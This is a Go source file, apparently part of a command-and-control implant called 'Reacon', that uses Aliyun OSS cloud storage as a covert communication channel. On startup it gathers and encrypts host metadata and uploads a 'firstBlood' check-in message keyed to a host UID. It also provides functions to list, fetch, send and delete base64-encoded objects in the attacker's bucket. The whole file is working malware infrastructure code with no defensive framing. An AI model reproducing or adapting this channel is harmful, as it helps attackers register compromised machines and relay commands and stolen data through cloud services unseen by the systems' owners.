package communication

import (
	"Reacon/pkg/encrypt"
	"Reacon/pkg/utils"
	"fmt"
	"github.com/aliyun/aliyun-oss-go-sdk/oss"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"
)

type Client struct {
	Cli             *oss.Client
	Bucket          *oss.Bucket
	Endpoint        string
	AccessKeyId     string
	AccessKeySecret string
	BucketName      string
}

var Service *Client

// var c *oss.Bucket

func InitClient(endPoint, accessKeyId, accessKeySecret, bucketName string) error {
	var ossClient *oss.Client
	var err error

	ossClient, err = oss.New(endPoint, accessKeyId, accessKeySecret)
	if err != nil {
		return err
	}

	var ossBucket *oss.Bucket
	ossBucket, err = ossClient.Bucket(bucketName)
	if err != nil {
		return err
	}

	Service = &Client{
		Cli:             ossClient,
		Bucket:          ossBucket,
		Endpoint:        endPoint,
		AccessKeyId:     accessKeyId,
		AccessKeySecret: accessKeySecret,
		BucketName:      bucketName,
	}
	go func() {
		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
			tmp, _ := encrypt.DecodeBase64(utils.MetaInfo)
			tmp, _ = encrypt.Decrypt(tmp)
			utils.Uid = encrypt.BytesToMD5(tmp)
		}
		firstBloodInt := 1
		firstBloodBytes := utils.WriteInt(firstBloodInt)
		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)

		Send(Service, utils.Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()), firstBloodMsg)
		time.Sleep(60 * time.Second)
	}()

	return nil
}
func List(c *Client) []oss.ObjectProperties {

	lsRes, err := c.Bucket.ListObjects(oss.MaxKeys(3), oss.Prefix(""))
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(-1)
	}
	// fmt.Println(lsRes)
	return lsRes.Objects

}
func Send(c *Client, name string, content []byte) {

	encodeData, err := encrypt.EncodeBase64(content)
	// 1.通过字符串上传对象
	f := strings.NewReader(string(encodeData))
	// var err error
	err = c.Bucket.PutObject(name, f)
	if err != nil {
		log.Println("[-]", "上传失败")
		return
	}

}
func Get(c *Client, name string) []byte {

	body, err := c.Bucket.GetObject(name)
	if err != nil {
		return nil
	}
	// 数据读取完成后，获取的流必须关闭，否则会造成连接泄漏，导致请求无连接可用，程序无法正常工作。
	defer body.Close()
	// println(body)
	data, err := ioutil.ReadAll(body)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(-1)
	}
	// fmt.Println(data)
	decodeData, err := encrypt.DecodeBase64(data)
	return decodeData
}

func Del(c *Client, name string) {
	err := c.Bucket.DeleteObject(name)
	if err != nil {
		panic(err)
	}

}
